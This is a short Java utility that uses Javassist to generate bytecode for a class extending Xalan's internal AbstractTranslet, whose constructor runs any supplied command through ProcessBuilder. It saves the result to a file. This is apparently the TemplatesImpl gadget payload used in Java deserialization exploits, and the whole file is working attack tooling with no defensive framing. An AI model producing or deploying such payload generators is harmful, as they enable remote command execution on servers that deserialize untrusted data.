package org.example.util;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtNewConstructor;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Generator {

    public static void saveTemplateImpl(String path, String[] cmd) {
        try {
            Files.write(Paths.get(path), getShortTemplatesImpl(cmd));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static byte[] getShortTemplatesImpl(String[] cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("a");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            String finalcmd="";
            int length = cmd.length;
            for (int i=0;i<length;i++){
                if (i==0){
                    finalcmd=finalcmd+"\""+cmd[i]+"\"";
                }else {
                    finalcmd=finalcmd+",\""+cmd[i]+"\"";
                }
            }

            String code="public a(){" +
                    "new ProcessBuilder(new String[]{"+finalcmd+"}).start();"+
                    "}";

            CtConstructor constructor = CtNewConstructor.make(code
                    , ctClass);


            ctClass.addConstructor(constructor);
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();

            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }
}
